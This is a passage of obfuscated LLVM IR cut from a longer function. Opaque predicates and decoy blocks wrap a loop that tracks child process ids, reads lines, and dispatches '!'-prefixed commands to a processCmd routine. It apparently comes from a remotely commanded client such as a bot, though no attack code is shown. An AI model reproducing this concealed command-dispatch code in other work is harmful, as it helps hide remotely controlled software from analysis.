  br i1 %151, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %143, label %152, label %257

; <label>:152:                                    ; preds = %originalBBpart28
  %153 = load i32, i32* @x.93
  %154 = load i32, i32* @y.94
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %152
  %161 = load i32, i32* %12, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %14, align 4
  %163 = load i32, i32* @x.93
  %164 = load i32, i32* @y.94
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBBpart217, label %originalBB10alteredBB

originalBBpart217:                                ; preds = %originalBB10
  br label %171

; <label>:171:                                    ; preds = %203, %originalBBpart217
  %172 = load i32, i32* %14, align 4
  %173 = zext i32 %172 to i64
  %174 = load i64, i64* @numpids, align 8
  %175 = icmp ult i64 %173, %174
  br i1 %175, label %176, label %206

; <label>:176:                                    ; preds = %171
  %177 = load i32, i32* @x.93
  %178 = load i32, i32* @y.94
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %176
  %185 = load i32*, i32** @pids, align 8
  %186 = load i32, i32* %14, align 4
  %187 = zext i32 %186 to i64
  %188 = getelementptr inbounds i32, i32* %185, i64 %187
  %189 = load i32, i32* %188, align 4
  %190 = load i32*, i32** @pids, align 8
  %191 = load i32, i32* %14, align 4
  %192 = sub i32 %191, 1
  %193 = zext i32 %192 to i64
  %194 = getelementptr inbounds i32, i32* %190, i64 %193
  store i32 %189, i32* %194, align 4
  %195 = load i32, i32* @x.93
  %196 = load i32, i32* @y.94
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBBpart227, label %originalBB19alteredBB

originalBBpart227:                                ; preds = %originalBB19
  br label %203

; <label>:203:                                    ; preds = %originalBBpart227
  %204 = load i32, i32* %14, align 4
  %205 = add i32 %204, 1
  store i32 %205, i32* %14, align 4
  br label %171

; <label>:206:                                    ; preds = %171
  %207 = load i32*, i32** @pids, align 8
  %208 = load i32, i32* %14, align 4
  %209 = sub i32 %208, 1
  %210 = zext i32 %209 to i64
  %211 = getelementptr inbounds i32, i32* %207, i64 %210
  store i32 0, i32* %211, align 4
  %212 = load i64, i64* @numpids, align 8
  %213 = add i64 %212, -1
  store i64 %213, i64* @numpids, align 8
  %214 = load i64, i64* @numpids, align 8
  %215 = add i64 %214, 1
  %216 = mul i64 %215, 4
  %217 = call noalias i8* @malloc(i64 %216) #5
  %218 = bitcast i8* %217 to i32*
  store i32* %218, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %219

; <label>:219:                                    ; preds = %250, %206
  %220 = load i32, i32* @x.93
  %221 = load i32, i32* @y.94
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %219
  %228 = load i32, i32* %14, align 4
  %229 = zext i32 %228 to i64
  %230 = load i64, i64* @numpids, align 8
  %231 = icmp ult i64 %229, %230
  %232 = load i32, i32* @x.93
  %233 = load i32, i32* @y.94
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %231, label %240, label %253

; <label>:240:                                    ; preds = %originalBBpart231
  %241 = load i32*, i32** @pids, align 8
  %242 = load i32, i32* %14, align 4
  %243 = zext i32 %242 to i64
  %244 = getelementptr inbounds i32, i32* %241, i64 %243
  %245 = load i32, i32* %244, align 4
  %246 = load i32*, i32** %13, align 8
  %247 = load i32, i32* %14, align 4
  %248 = zext i32 %247 to i64
  %249 = getelementptr inbounds i32, i32* %246, i64 %248
  store i32 %245, i32* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %240
  %251 = load i32, i32* %14, align 4
  %252 = add i32 %251, 1
  store i32 %252, i32* %14, align 4
  br label %219

; <label>:253:                                    ; preds = %originalBBpart231
  %254 = load i32*, i32** @pids, align 8
  %255 = bitcast i32* %254 to i8*
  call void @free(i8* %255) #5
  %256 = load i32*, i32** %13, align 8
  store i32* %256, i32** @pids, align 8
  br label %257

; <label>:257:                                    ; preds = %253, %originalBBpart28
  br label %258

; <label>:258:                                    ; preds = %257
  %259 = load i32, i32* @x.93
  %260 = load i32, i32* @y.94
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %258
  %267 = load i32, i32* %12, align 4
  %268 = add nsw i32 %267, 1
  store i32 %268, i32* %12, align 4
  %269 = load i32, i32* @x.93
  %270 = load i32, i32* @y.94
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBBpart246, label %originalBB33alteredBB

originalBBpart246:                                ; preds = %originalBB33
  br label %107

; <label>:277:                                    ; preds = %originalBBpart24
  %278 = load i32, i32* %11, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %279
  store i8 0, i8* %280, align 1
  %281 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %281)
  %282 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %283 = call i8* @strstr(i8* %282, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #9
  %284 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %285 = icmp eq i8* %283, %284
  br i1 %285, label %286, label %287

; <label>:286:                                    ; preds = %277
  br label %101

; <label>:287:                                    ; preds = %277
  %288 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %289 = call i8* @strstr(i8* %288, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.536, i32 0, i32 0)) #9
  %290 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %291 = icmp eq i8* %289, %290
  br i1 %291, label %292, label %309

; <label>:292:                                    ; preds = %287
  %293 = load i32, i32* @x.93
  %294 = load i32, i32* @y.94
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %292
  call void @exit(i32 0) #12
  %301 = load i32, i32* @x.93
  %302 = load i32, i32* @y.94
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  unreachable

; <label>:309:                                    ; preds = %287
  %310 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %310, i8** %15, align 8
  %311 = load i8*, i8** %15, align 8
  %312 = load i8, i8* %311, align 1
  %313 = zext i8 %312 to i32
  %314 = icmp eq i32 %313, 33
  br i1 %314, label %315, label %643

; <label>:315:                                    ; preds = %309
  %316 = load i8*, i8** %15, align 8
  %317 = getelementptr inbounds i8, i8* %316, i64 1
  store i8* %317, i8** %16, align 8
  br label %318

; <label>:318:                                    ; preds = %originalBBpart262, %315
  %319 = load i32, i32* @x.93
  %320 = load i32, i32* @y.94
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %318
  %327 = load i8*, i8** %16, align 8
  %328 = load i8, i8* %327, align 1
  %329 = zext i8 %328 to i32
  %330 = icmp ne i32 %329, 32
  %331 = load i32, i32* @x.93
  %332 = load i32, i32* @y.94
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %330, label %339, label %360

; <label>:339:                                    ; preds = %originalBBpart254
  %340 = load i32, i32* @x.93
  %341 = load i32, i32* @y.94
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %339
  %348 = load i8*, i8** %16, align 8
  %349 = load i8, i8* %348, align 1
  %350 = zext i8 %349 to i32
  %351 = icmp ne i32 %350, 0
  %352 = load i32, i32* @x.93
  %353 = load i32, i32* @y.94
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %360

; <label>:360:                                    ; preds = %originalBBpart258, %originalBBpart254
  %361 = phi i1 [ false, %originalBBpart254 ], [ %351, %originalBBpart258 ]
  br i1 %361, label %362, label %381

; <label>:362:                                    ; preds = %360
  %363 = load i32, i32* @x.93
  %364 = load i32, i32* @y.94
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %362
  %371 = load i8*, i8** %16, align 8
  %372 = getelementptr inbounds i8, i8* %371, i32 1
  store i8* %372, i8** %16, align 8
  %373 = load i32, i32* @x.93
  %374 = load i32, i32* @y.94
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %318

; <label>:381:                                    ; preds = %360
  %382 = load i8*, i8** %16, align 8
  %383 = load i8, i8* %382, align 1
  %384 = zext i8 %383 to i32
  %385 = icmp eq i32 %384, 0
  br i1 %385, label %386, label %387

; <label>:386:                                    ; preds = %381
  br label %101

; <label>:387:                                    ; preds = %381
  %388 = load i8*, i8** %16, align 8
  store i8 0, i8* %388, align 1
  %389 = load i8*, i8** %15, align 8
  %390 = getelementptr inbounds i8, i8* %389, i64 1
  store i8* %390, i8** %16, align 8
  %391 = load i8*, i8** %15, align 8
  %392 = load i8*, i8** %16, align 8
  %393 = call i64 @strlen(i8* %392) #9
  %394 = getelementptr inbounds i8, i8* %391, i64 %393
  %395 = getelementptr inbounds i8, i8* %394, i64 2
  store i8* %395, i8** %15, align 8
  br label %396

; <label>:396:                                    ; preds = %originalBBpart273, %387
  %397 = load i8*, i8** %15, align 8
  %398 = load i8*, i8** %15, align 8
  %399 = call i64 @strlen(i8* %398) #9
  %400 = sub i64 %399, 1
  %401 = getelementptr inbounds i8, i8* %397, i64 %400
  %402 = load i8, i8* %401, align 1
  %403 = zext i8 %402 to i32
  %404 = icmp eq i32 %403, 10
  br i1 %404, label %430, label %405

; <label>:405:                                    ; preds = %396
  %406 = load i32, i32* @x.93
  %407 = load i32, i32* @y.94
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %405
  %414 = load i8*, i8** %15, align 8
  %415 = load i8*, i8** %15, align 8
  %416 = call i64 @strlen(i8* %415) #9
  %417 = sub i64 %416, 1
  %418 = getelementptr inbounds i8, i8* %414, i64 %417
  %419 = load i8, i8* %418, align 1
  %420 = zext i8 %419 to i32
  %421 = icmp eq i32 %420, 13
  %422 = load i32, i32* @x.93
  %423 = load i32, i32* @y.94
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBBpart267, label %originalBB64alteredBB

originalBBpart267:                                ; preds = %originalBB64
  br label %430

; <label>:430:                                    ; preds = %originalBBpart267, %396
  %431 = phi i1 [ true, %396 ], [ %421, %originalBBpart267 ]
  br i1 %431, label %432, label %454

; <label>:432:                                    ; preds = %430
  %433 = load i32, i32* @x.93
  %434 = load i32, i32* @y.94
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %432
  %441 = load i8*, i8** %15, align 8
  %442 = load i8*, i8** %15, align 8
  %443 = call i64 @strlen(i8* %442) #9
  %444 = sub i64 %443, 1
  %445 = getelementptr inbounds i8, i8* %441, i64 %444
  store i8 0, i8* %445, align 1
  %446 = load i32, i32* @x.93
  %447 = load i32, i32* @y.94
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart273, label %originalBB69alteredBB

originalBBpart273:                                ; preds = %originalBB69
  br label %396

; <label>:454:                                    ; preds = %430
  %455 = load i8*, i8** %15, align 8
  store i8* %455, i8** %17, align 8
  br label %456

; <label>:456:                                    ; preds = %484, %454
  %457 = load i8*, i8** %15, align 8
  %458 = load i8, i8* %457, align 1
  %459 = zext i8 %458 to i32
  %460 = icmp ne i32 %459, 32
  br i1 %460, label %461, label %482

; <label>:461:                                    ; preds = %456
  %462 = load i32, i32* @x.93
  %463 = load i32, i32* @y.94
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %461
  %470 = load i8*, i8** %15, align 8
  %471 = load i8, i8* %470, align 1
  %472 = zext i8 %471 to i32
  %473 = icmp ne i32 %472, 0
  %474 = load i32, i32* @x.93
  %475 = load i32, i32* @y.94
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %482

; <label>:482:                                    ; preds = %originalBBpart277, %456
  %483 = phi i1 [ false, %456 ], [ %473, %originalBBpart277 ]
  br i1 %483, label %484, label %487

; <label>:484:                                    ; preds = %482
  %485 = load i8*, i8** %15, align 8
  %486 = getelementptr inbounds i8, i8* %485, i32 1
  store i8* %486, i8** %15, align 8
  br label %456

; <label>:487:                                    ; preds = %482
  %488 = load i8*, i8** %15, align 8
  store i8 0, i8* %488, align 1
  %489 = load i8*, i8** %15, align 8
  %490 = getelementptr inbounds i8, i8* %489, i32 1
  store i8* %490, i8** %15, align 8
  %491 = load i8*, i8** %17, align 8
  store i8* %491, i8** %18, align 8
  br label %492

; <label>:492:                                    ; preds = %496, %487
  %493 = load i8*, i8** %18, align 8
  %494 = load i8, i8* %493, align 1
  %495 = icmp ne i8 %494, 0
  br i1 %495, label %496, label %505

; <label>:496:                                    ; preds = %492
  %497 = load i8*, i8** %18, align 8
  %498 = load i8, i8* %497, align 1
  %499 = zext i8 %498 to i32
  %500 = call i32 @toupper(i32 %499) #9
  %501 = trunc i32 %500 to i8
  %502 = load i8*, i8** %18, align 8
  store i8 %501, i8* %502, align 1
  %503 = load i8*, i8** %18, align 8
  %504 = getelementptr inbounds i8, i8* %503, i32 1
  store i8* %504, i8** %18, align 8
  br label %492

; <label>:505:                                    ; preds = %492
  store i32 1, i32* %20, align 4
  %506 = load i8*, i8** %15, align 8
  %507 = call i8* @strtok(i8* %506, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.537, i32 0, i32 0)) #5
  store i8* %507, i8** %21, align 8
  %508 = load i8*, i8** %17, align 8
  %509 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %508, i8** %509, align 16
  br label %510

; <label>:510:                                    ; preds = %557, %505
  %511 = load i8*, i8** %21, align 8
  %512 = icmp ne i8* %511, null
  br i1 %512, label %513, label %559

; <label>:513:                                    ; preds = %510
  %514 = load i32, i32* @x.93
  %515 = load i32, i32* @y.94
  %516 = sub i32 %514, 1
  %517 = mul i32 %514, %516
  %518 = urem i32 %517, 2
  %519 = icmp eq i32 %518, 0
  %520 = icmp slt i32 %515, 10
  %521 = or i1 %519, %520
  br i1 %521, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %513
  %522 = load i8*, i8** %21, align 8
  %523 = load i8, i8* %522, align 1
  %524 = zext i8 %523 to i32
  %525 = icmp ne i32 %524, 10
  %526 = load i32, i32* @x.93
  %527 = load i32, i32* @y.94
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br i1 %525, label %534, label %557

; <label>:534:                                    ; preds = %originalBBpart281
  %535 = load i8*, i8** %21, align 8
  %536 = call i64 @strlen(i8* %535) #9
  %537 = add i64 %536, 1
  %538 = call noalias i8* @malloc(i64 %537) #5
  %539 = load i32, i32* %20, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %540
  store i8* %538, i8** %541, align 8
  %542 = load i32, i32* %20, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %543
  %545 = load i8*, i8** %544, align 8
  %546 = load i8*, i8** %21, align 8
  %547 = call i64 @strlen(i8* %546) #9
  %548 = add i64 %547, 1
  call void @llvm.memset.p0i8.i64(i8* %545, i8 0, i64 %548, i32 1, i1 false)
  %549 = load i32, i32* %20, align 4
  %550 = sext i32 %549 to i64
  %551 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %550
  %552 = load i8*, i8** %551, align 8
  %553 = load i8*, i8** %21, align 8
  %554 = call i8* @strcpy(i8* %552, i8* %553) #5
  %555 = load i32, i32* %20, align 4
  %556 = add nsw i32 %555, 1
  store i32 %556, i32* %20, align 4
  br label %557

; <label>:557:                                    ; preds = %534, %originalBBpart281
  %558 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.537, i32 0, i32 0)) #5
  store i8* %558, i8** %21, align 8
  br label %510

; <label>:559:                                    ; preds = %510
  %560 = load i32, i32* @x.93
  %561 = load i32, i32* @y.94
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %559
  %568 = load i32, i32* %20, align 4
  %569 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %568, i8** %569)
  %570 = load i32, i32* %20, align 4
  %571 = icmp sgt i32 %570, 1
  %572 = load i32, i32* @x.93
  %573 = load i32, i32* @y.94
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br i1 %571, label %580, label %642

; <label>:580:                                    ; preds = %originalBBpart285
  %581 = load i32, i32* @x.93
  %582 = load i32, i32* @y.94
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %580
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  %589 = load i32, i32* @x.93
  %590 = load i32, i32* @y.94
  %591 = sub i32 %589, 1
  %592 = mul i32 %589, %591
  %593 = urem i32 %592, 2
  %594 = icmp eq i32 %593, 0
  %595 = icmp slt i32 %590, 10
  %596 = or i1 %594, %595
  br i1 %596, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %597

; <label>:597:                                    ; preds = %622, %originalBBpart289
  %598 = load i32, i32* %22, align 4
  %599 = load i32, i32* %20, align 4
  %600 = icmp slt i32 %598, %599
  br i1 %600, label %601, label %625

; <label>:601:                                    ; preds = %597
  %602 = load i32, i32* @x.93
  %603 = load i32, i32* @y.94
  %604 = sub i32 %602, 1
  %605 = mul i32 %602, %604
  %606 = urem i32 %605, 2
  %607 = icmp eq i32 %606, 0
  %608 = icmp slt i32 %603, 10
  %609 = or i1 %607, %608
  br i1 %609, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %601
  %610 = load i32, i32* %22, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %611
  %613 = load i8*, i8** %612, align 8
  call void @free(i8* %613) #5
  %614 = load i32, i32* @x.93
  %615 = load i32, i32* @y.94
  %616 = sub i32 %614, 1
  %617 = mul i32 %614, %616
  %618 = urem i32 %617, 2
  %619 = icmp eq i32 %618, 0
  %620 = icmp slt i32 %615, 10
  %621 = or i1 %619, %620
  br i1 %621, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br label %622

; <label>:622:                                    ; preds = %originalBBpart293
  %623 = load i32, i32* %22, align 4
  %624 = add nsw i32 %623, 1
  store i32 %624, i32* %22, align 4
  br label %597

; <label>:625:                                    ; preds = %597
  %626 = load i32, i32* @x.93
  %627 = load i32, i32* @y.94
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %625
  %634 = load i32, i32* @x.93
  %635 = load i32, i32* @y.94
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br label %642

; <label>:642:                                    ; preds = %originalBBpart297, %originalBBpart285
  br label %643

; <label>:643:                                    ; preds = %642, %309
  %644 = load i32, i32* @x.93
  %645 = load i32, i32* @y.94
  %646 = sub i32 %644, 1
  %647 = mul i32 %644, %646
  %648 = urem i32 %647, 2
  %649 = icmp eq i32 %648, 0
  %650 = icmp slt i32 %645, 10
  %651 = or i1 %649, %650
  br i1 %651, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %643
  %652 = load i32, i32* @x.93
  %653 = load i32, i32* @y.94
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %101

; <label>:660:                                    ; preds = %101
  br label %661

; <label>:661:                                    ; preds = %660, %88
  ret i32 0

originalBBalteredBB:                              ; preds = %originalBB, %63
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %107
  %662 = load i32, i32* %12, align 4
  %663 = sext i32 %662 to i64
  %664 = load i64, i64* @numpids, align 8
  %665 = icmp ult i64 %663, %664
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %128
  %666 = load i32*, i32** @pids, align 8
  %667 = load i32, i32* %12, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds i32, i32* %666, i64 %668
  %670 = load i32, i32* %669, align 4
  %671 = call i32 @waitpid(i32 %670, i32* null, i32 1)
  %672 = icmp sgt i32 %671, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %152
  %673 = load i32, i32* %12, align 4
  %_ = sub i32 %673, 1
  %gen = mul i32 %_, 1
  %_11 = sub i32 0, %673
  %gen12 = add i32 %_11, 1
  %_13 = shl i32 %673, 1
  %_14 = sub i32 %673, 1
  %gen15 = mul i32 %_14, 1
  %674 = add nsw i32 %673, 1
  store i32 %674, i32* %14, align 4
  br label %originalBB10

originalBB19alteredBB:                            ; preds = %originalBB19, %176
  %675 = load i32*, i32** @pids, align 8
  %676 = load i32, i32* %14, align 4
  %677 = zext i32 %676 to i64
  %678 = getelementptr inbounds i32, i32* %675, i64 %677
  %679 = load i32, i32* %678, align 4
  %680 = load i32*, i32** @pids, align 8
  %681 = load i32, i32* %14, align 4
  %_20 = sub i32 0, %681
  %gen21 = add i32 %_20, 1
  %_22 = shl i32 %681, 1
  %_23 = shl i32 %681, 1
  %_24 = sub i32 0, %681
  %gen25 = add i32 %_24, 1
  %682 = sub i32 %681, 1
  %683 = zext i32 %682 to i64
  %684 = getelementptr inbounds i32, i32* %680, i64 %683
  store i32 %679, i32* %684, align 4
  br label %originalBB19

originalBB29alteredBB:                            ; preds = %originalBB29, %219
  %685 = load i32, i32* %14, align 4
  %686 = zext i32 %685 to i64
  %687 = load i64, i64* @numpids, align 8
  %688 = icmp ult i64 %686, %687
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %258
  %689 = load i32, i32* %12, align 4
  %_34 = sub i32 %689, 1
  %gen35 = mul i32 %_34, 1
  %_36 = sub i32 0, %689
  %gen37 = add i32 %_36, 1
  %_38 = sub i32 %689, 1
  %gen39 = mul i32 %_38, 1
  %_40 = shl i32 %689, 1
  %_41 = sub i32 0, %689
  %gen42 = add i32 %_41, 1
  %_43 = sub i32 %689, 1
  %gen44 = mul i32 %_43, 1
  %690 = add nsw i32 %689, 1
  store i32 %690, i32* %12, align 4
  br label %originalBB33

originalBB48alteredBB:                            ; preds = %originalBB48, %292
  call void @exit(i32 0) #12
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %318
  %691 = load i8*, i8** %16, align 8
  %692 = load i8, i8* %691, align 1
  %693 = zext i8 %692 to i32
  %694 = icmp ne i32 %693, 32
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %339
  %695 = load i8*, i8** %16, align 8
  %696 = load i8, i8* %695, align 1
  %697 = zext i8 %696 to i32
  %698 = icmp ne i32 %697, 0
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %362
  %699 = load i8*, i8** %16, align 8
  %700 = getelementptr inbounds i8, i8* %699, i32 1
  store i8* %700, i8** %16, align 8
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %405
  %701 = load i8*, i8** %15, align 8
  %702 = load i8*, i8** %15, align 8
  %703 = call i64 @strlen(i8* %702) #9
  %_65 = shl i64 %703, 1
